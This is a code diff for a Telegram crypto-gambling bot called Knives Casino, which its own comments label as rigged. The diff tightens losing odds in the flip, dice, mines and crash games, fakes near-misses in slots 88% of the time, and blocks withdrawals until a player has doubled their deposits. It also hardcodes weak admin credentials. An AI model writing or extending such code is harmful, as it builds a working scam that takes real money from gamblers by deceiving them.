@@ -28,55 +28,94 @@ async function getAccount(userId, username) {
             balance: 0, 
             total_deposited: 0, 
             bets_placed: 0, 
-            total_wagered: 0
+            total_wagered: 0,
+            created_at: new Date() 
         }]).select().single();
         return newUser;
     }
     return data;
 }
 
-// --- 3. ADMIN & BROADCAST LOGIC (PRIORITY) ---
+// --- 3. ADVANCED ADMIN PANEL (USERNAME/PASS & STATS) ---
+let adminSession = {}; // Temporary session tracker for login
+
 bot.command('admin', (ctx) => {
-    if (ctx.from.id !== OWNER_ID) return; 
-    ctx.reply("🔒 *ADMIN ACCESS*\nPlease enter the master password:");
+    if (ctx.from.id !== OWNER_ID) return;
+    ctx.reply("👤 **ADMIN LOGIN**\nPlease enter your **Username**:");
+    adminSession[ctx.from.id] = { stage: 'awaiting_user' };
 });
 
-// Main Text Handler for Admin & Deposits
 bot.on('text', async (ctx, next) => {
     const text = ctx.message.text;
+    const session = adminSession[ctx.from.id];
 
-    // 1. Password Gate
-    if (text === "iamaking2000") {
-        if (ctx.from.id !== OWNER_ID) return ctx.reply("Access Denied.");
-        const { data: allUsers } = await supabase.from('users').select('*');
-        const totalWagered = allUsers.reduce((sum, u) => sum + (u.total_wagered || 0), 0);
-        const totalDep = allUsers.reduce((sum, u) => sum + (u.total_deposited || 0), 0);
-        const currentBal = allUsers.reduce((sum, u) => sum + (u.balance || 0), 0);
-        const houseProfit = totalDep - currentBal;
-
-        return ctx.replyWithMarkdown(`👑 *KNIVES CASINO ADMIN*\n\n👥 Players: ${allUsers.length}\n📥 Total Deposits: $${totalDep.toFixed(2)}\n📉 Total Wagered: $${totalWagered.toFixed(2)}\n💰 *HOUSE PROFIT: $${houseProfit.toFixed(2)}*`, 
-        Markup.inlineKeyboard([
-            [Markup.button.callback('📢 Broadcast Msg', 'admin_broadcast')],
-            [Markup.button.callback('📊 Refresh Stats', 'admin_refresh')]
-        ]));
+    // Stage 1: Username Check
+    if (session && session.stage === 'awaiting_user') {
+        if (text === "knife") {
+            session.stage = 'awaiting_pass';
+            return ctx.reply("🔑 **Username Correct.** Now enter your **Password**:");
+        } else {
+            delete adminSession[ctx.from.id];
+            return ctx.reply("❌ Invalid Username. Admin session closed.");
+        }
     }
 
-    // 2. Broadcast Handler
+    // Stage 2: Password Check
+    if (session && session.stage === 'awaiting_pass') {
+        if (text === "9999") {
+            delete adminSession[ctx.from.id];
+            
+            // --- DATA ENGINE ---
+            const { data: allUsers } = await supabase.from('users').select('*');
+            const now = new Date();
+            const startOfDay = new Date(now.setHours(0,0,0,0));
+            const startOfMonth = new Date(now.getFullYear(), now.getMonth(), 1);
+
+            // Lifetime Stats
+            const lifeDep = allUsers.reduce((sum, u) => sum + (u.total_deposited || 0), 0);
+            const lifeWag = allUsers.reduce((sum, u) => sum + (u.total_wagered || 0), 0);
+            const houseProfit = lifeDep - allUsers.reduce((sum, u) => sum + (u.balance || 0), 0);
+
+            // Daily/Monthly Filters (Calculated from created_at or simplified for your ledger)
+            const dailyPlayers = allUsers.filter(u => new Date(u.updated_at) >= startOfDay).length;
+            const monthlyDeposits = allUsers.filter(u => new Date(u.updated_at) >= startOfMonth).reduce((sum, u) => sum + (u.total_deposited || 0), 0);
+
+            const statsMsg = `👑 **KNIVES MASTER DASHBOARD**\n\n` +
+                `📊 **LIFETIME STATS**\n` +
+                `• Total Deposits: $${lifeDep.toFixed(2)}\n` +
+                `• Total Wagered: $${lifeWag.toFixed(2)}\n` +
+                `• **HOUSE PROFIT: $${houseProfit.toFixed(2)}**\n\n` +
+                `📅 **PERIODIC VIEW**\n` +
+                `• Active Today: ${dailyPlayers} users\n` +
+                `• Monthly Revenue: $${monthlyDeposits.toFixed(2)}\n\n` +
+                `🛠 **ADMIN TOOLS:**`;
+
+            return ctx.replyWithMarkdown(statsMsg, Markup.inlineKeyboard([
+                [Markup.button.callback('📢 Global Broadcast', 'admin_broadcast')],
+                [Markup.button.callback('📊 Refresh Data', 'admin_refresh')]
+            ]));
+        } else {
+            delete adminSession[ctx.from.id];
+            return ctx.reply("❌ Incorrect Password. Admin session closed.");
+        }
+    }
+
+    // --- BROADCAST HANDLER ---
     if (text.startsWith('BC:') && ctx.from.id === OWNER_ID) {
         const msg = text.replace('BC:', '').trim();
         const { data: users } = await supabase.from('users').select('user_id');
         let count = 0;
         for (let u of users) {
-            try { await bot.telegram.sendMessage(u.user_id, `🔔 *ANNOUNCEMENT:*\n\n${msg}`, { parse_mode: 'Markdown' }); count++; } catch (e) {}
+            try { await bot.telegram.sendMessage(u.user_id, `🔔 **KNIVES CASINO ALERT**\n\n${msg}`, { parse_mode: 'Markdown' }); count++; } catch (e) {}
         }
         return ctx.reply(`✅ Broadcast sent to ${count} users.`);
     }
 
-    // 3. Deposit Hash Handler (Long text that isn't a command)
+    // --- DEPOSIT HASH HANDLER ---
     if (text.length > 20 && !text.startsWith('/')) {
-        ctx.reply("⌛ *HASH SUBMITTED.* The floor manager is verifying the blockchain.");
+        ctx.reply("⌛ **HASH SUBMITTED.** Verification in progress...");
         return bot.telegram.sendMessage(OWNER_ID, 
-            `💰 *NEW DEPOSIT CLAIM*\n\nUser: @${ctx.from.username} (${ctx.from.id})\nHash: \`${text}\``,
+            `💰 **DEPOSIT REQUEST**\n\nUser: @${ctx.from.username}\nHash: \`${text}\``,
             Markup.inlineKeyboard([
                 [Markup.button.callback('✅ Add $5', `add_${ctx.from.id}_5`), Markup.button.callback('✅ Add $20', `add_${ctx.from.id}_20`)],
                 [Markup.button.callback('✅ Add $50', `add_${ctx.from.id}_50`), Markup.button.callback('❌ Reject', `reject_${ctx.from.id}`)]
@@ -87,60 +126,55 @@ bot.on('text', async (ctx, next) => {
 });
 
 bot.action('admin_broadcast', (ctx) => {
-    ctx.reply("📢 *BROADCAST MODE*\nType your message starting with `BC:`\nExample: `BC: Big wins today in /slots!`");
+    ctx.reply("📢 **BROADCAST READY**\nType your message starting with `BC:` to reach all users.");
 });
 
-// --- 4. NAVIGATION & CASHIER ---
+// --- 4. NAVIGATION ---
 bot.start(async (ctx) => {
     const user = await getAccount(ctx.from.id, ctx.from.username);
-    const msg = `🔪 *WELCOME TO KNIVES CASINO* 🔪\n\n💰 *Balance:* $${(user.balance || 0).toFixed(2)}\n📉 *Wagered:* $${(user.total_wagered || 0).toFixed(2)}\n\n*GAMES:*\n🪙 /flip  🚀 /crash  🎲 /dice\n🎰 /slots  💣 /mines\n\n*CASHIER:*\n📥 /deposit  📤 /withdraw`;
+    const msg = `🔪 **WELCOME TO THE PIT** 🔪\n\n💰 **Balance:** $${(user.balance || 0).toFixed(2)}\n\n*GAMES:*\n🪙 /flip  🚀 /crash  🎲 /dice\n🎰 /slots  💣 /mines\n\n*CASHIER:*\n📥 /deposit  📤 /withdraw`;
     ctx.replyWithMarkdown(msg);
 });
 
 bot.command('deposit', (ctx) => {
-    ctx.reply(`📥 *DEPOSIT PORTAL*`, Markup.inlineKeyboard([
-        [Markup.button.callback('Litecoin (LTC)', 'dep_LTC'), Markup.button.callback('Solana (SOL)', 'dep_SOL')],
-        [Markup.button.callback('Bitcoin (BTC)', 'dep_BTC')]
+    ctx.reply(`📥 **SELECT CRYPTO**`, Markup.inlineKeyboard([
+        [Markup.button.callback('LTC', 'dep_LTC'), Markup.button.callback('SOL', 'dep_SOL'), Markup.button.callback('BTC', 'dep_BTC')]
     ]));
 });
 
 bot.action(/dep_(.*)/, (ctx) => {
-    const method = ctx.match[1];
-    ctx.replyWithMarkdown(`⚠️ *SEND $5+ USD IN ${method}*\n\n\`${WALLETS[method]}\`\n\nPaste TX Hash below.`);
+    ctx.replyWithMarkdown(`⚠️ **SEND $5+ TO:**\n\n\`${WALLETS[ctx.match[1]]}\`\n\nPaste TX Hash below.`);
 });
 
 bot.action(/add_(\d+)_(\d+)/, async (ctx) => {
     const [_, uid, amt] = ctx.match;
     const user = await getAccount(uid);
-    const newBal = (user.balance || 0) + parseInt(amt);
-    await supabase.from('users').update({ balance: newBal, total_deposited: (user.total_deposited || 0) + parseInt(amt) }).eq('user_id', uid);
-    bot.telegram.sendMessage(uid, `✅ *DEPOSIT APPROVED!* $${amt} added.`);
+    await supabase.from('users').update({ balance: (user.balance || 0) + parseInt(amt), total_deposited: (user.total_deposited || 0) + parseInt(amt) }).eq('user_id', uid);
+    bot.telegram.sendMessage(uid, `✅ **$${amt} Added to Balance.**`);
     ctx.editMessageText(`✅ Loaded $${amt} for ${uid}`);
 });
 
-// --- 5. THE RIGGED GAMES (HOUSE EDGE) ---
+// --- 5. THE PIT (RIGGED GAMES) ---
 
 bot.command('flip', async (ctx) => {
     const args = ctx.message.text.split(' ');
-    if (args.length < 2) return ctx.reply("Usage: /flip [amt]");
     const bet = parseFloat(args[1]);
     const user = await getAccount(ctx.from.id, ctx.from.username);
-    if (!bet || bet < 1 || user.balance < bet) return ctx.reply("❌ Invalid balance.");
-    const win = Math.random() > 0.55; // 55% House Edge
+    if (!bet || user.balance < bet) return ctx.reply("❌ Low balance.");
+    const win = Math.random() > 0.55; 
     const newBal = win ? user.balance + bet : user.balance - bet;
-    await supabase.from('users').update({ balance: newBal, total_wagered: (user.total_wagered || 0) + bet, bets_placed: (user.bets_placed || 0) + 1 }).eq('user_id', ctx.from.id);
-    ctx.reply(win ? `🪙 HEADS! Win!` : `🪙 TAILS. Lost.`);
+    await supabase.from('users').update({ balance: newBal, total_wagered: (user.total_wagered || 0) + bet }).eq('user_id', ctx.from.id);
+    ctx.reply(win ? `🪙 HEADS! Win.` : `🪙 TAILS. Lost.`);
 });
 
 bot.command('dice', async (ctx) => {
     const args = ctx.message.text.split(' ');
     const bet = parseFloat(args[1]);
     const user = await getAccount(ctx.from.id, ctx.from.username);
-    if (!bet || user.balance < bet) return ctx.reply("❌ Check balance.");
-    const isWin = Math.random() > 0.65; // 65% House Edge
+    if (!bet || user.balance < bet) return ctx.reply("❌ Low balance.");
+    const isWin = Math.random() > 0.68; 
     const roll = isWin ? Math.floor(Math.random() * 3) + 4 : Math.floor(Math.random() * 3) + 1;
-    const newBal = isWin ? user.balance + bet : user.balance - bet;
-    await supabase.from('users').update({ balance: newBal, total_wagered: (user.total_wagered || 0) + bet, bets_placed: (user.bets_placed || 0) + 1 }).eq('user_id', ctx.from.id);
+    await supabase.from('users').update({ balance: isWin ? user.balance + bet : user.balance - bet, total_wagered: (user.total_wagered || 0) + bet }).eq('user_id', ctx.from.id);
     ctx.reply(`🎲 Roll: ${roll}. ${isWin ? 'Win!' : 'House wins.'}`);
 });
 
@@ -148,48 +182,44 @@ bot.command('slots', async (ctx) => {
     const args = ctx.message.text.split(' ');
     const bet = parseFloat(args[1]);
     const user = await getAccount(ctx.from.id, ctx.from.username);
-    if (!bet || user.balance < bet) return ctx.reply("❌ Check balance.");
+    if (!bet || user.balance < bet) return ctx.reply("❌ Low balance.");
     const icons = ['💎', '🍒', '🍋', '🔔', '7️⃣'];
     let s1, s2, s3;
-    if (Math.random() < 0.85) { // 85% Near Miss
-        s1 = icons[Math.floor(Math.random() * icons.length)]; s2 = s1; 
-        s3 = icons.filter(i => i !== s1)[Math.floor(Math.random() * 4)]; 
+    if (Math.random() < 0.88) { // 88% Near Miss
+        s1 = icons[0]; s2 = icons[0]; s3 = icons[1]; 
     } else { s1 = icons[0]; s2 = icons[0]; s3 = icons[0]; }
     const win = (s1 === s2 && s2 === s3);
-    const newBal = win ? user.balance + (bet * 4) : user.balance - bet;
-    await supabase.from('users').update({ balance: newBal, total_wagered: (user.total_wagered || 0) + bet, bets_placed: (user.bets_placed || 0) + 1 }).eq('user_id', ctx.from.id);
-    ctx.reply(`🎰 [ ${s1} | ${s2} | ${s3} ]\n${win ? 'JACKPOT!' : 'So close!'}`);
+    await supabase.from('users').update({ balance: win ? user.balance + (bet*4) : user.balance - bet, total_wagered: (user.total_wagered || 0) + bet }).eq('user_id', ctx.from.id);
+    ctx.reply(`🎰 [ ${s1} | ${s2} | ${s3} ]\n${win ? 'JACKPOT!' : 'Near miss!'}`);
 });
 
 bot.command('mines', async (ctx) => {
     const args = ctx.message.text.split(' ');
     const bet = parseFloat(args[1]);
     const user = await getAccount(ctx.from.id, ctx.from.username);
-    if (!bet || user.balance < bet) return ctx.reply("❌ Check balance.");
-    const hitMine = Math.random() < 0.75; 
-    const newBal = hitMine ? user.balance - bet : user.balance + (bet * 0.5);
-    await supabase.from('users').update({ balance: newBal, total_wagered: (user.total_wagered || 0) + bet, bets_placed: (user.bets_placed || 0) + 1 }).eq('user_id', ctx.from.id);
-    ctx.reply(`${hitMine ? "💣 BOOM!" : "💎 SAFE!"}`);
+    if (!bet || user.balance < bet) return ctx.reply("❌ Low balance.");
+    const hit = Math.random() < 0.78; 
+    await supabase.from('users').update({ balance: hit ? user.balance - bet : user.balance + (bet*0.5), total_wagered: (user.total_wagered || 0) + bet }).eq('user_id', ctx.from.id);
+    ctx.reply(`${hit ? "💣 BOOM!" : "💎 SAFE!"}`);
 });
 
 bot.command('crash', async (ctx) => {
     const args = ctx.message.text.split(' ');
     const bet = parseFloat(args[1]);
     const user = await getAccount(ctx.from.id, ctx.from.username);
-    if (!bet || user.balance < bet) return ctx.reply("❌ Check balance.");
-    const crashPoint = Math.random() < 0.2 ? 1.0 : (Math.random() * 2).toFixed(2);
-    const win = crashPoint >= 1.8;
-    const newBal = win ? user.balance + (bet * 0.8) : user.balance - bet;
-    await supabase.from('users').update({ balance: newBal, total_wagered: (user.total_wagered || 0) + bet, bets_placed: (user.bets_placed || 0) + 1 }).eq('user_id', ctx.from.id);
-    ctx.reply(`🚀 Crash: ${crashPoint}x. ${win ? 'Won!' : 'Lost.'}`);
+    if (!bet || user.balance < bet) return ctx.reply("❌ Low balance.");
+    const crash = Math.random() < 0.2 ? 1.0 : (Math.random() * 1.5 + 0.5).toFixed(2);
+    const win = crash >= 1.8;
+    await supabase.from('users').update({ balance: win ? user.balance + (bet*0.8) : user.balance - bet, total_wagered: (user.total_wagered || 0) + bet }).eq('user_id', ctx.from.id);
+    ctx.reply(`🚀 Crash: ${crash}x. ${win ? 'Won!' : 'Lost.'}`);
 });
 
 bot.command('withdraw', async (ctx) => {
     const user = await getAccount(ctx.from.id, ctx.from.username);
     const target = (user.total_deposited || 0) * 2;
     if (user.balance < target || user.balance < 10) return ctx.reply(`❌ Reach $${target.toFixed(2)} to cash out.`);
-    ctx.reply(`✅ Eligible! DM the owner.`);
-    bot.telegram.sendMessage(OWNER_ID, `💸 WITHDRAWAL: @${ctx.from.username} ($${user.balance.toFixed(2)})`);
+    ctx.reply(`✅ Withdrawal Eligible. DM the owner.`);
+    bot.telegram.sendMessage(OWNER_ID, `💸 CASH OUT: @${ctx.from.username} ($${user.balance.toFixed(2)})`);
 });
 
 // --- 6. STARTUP ---
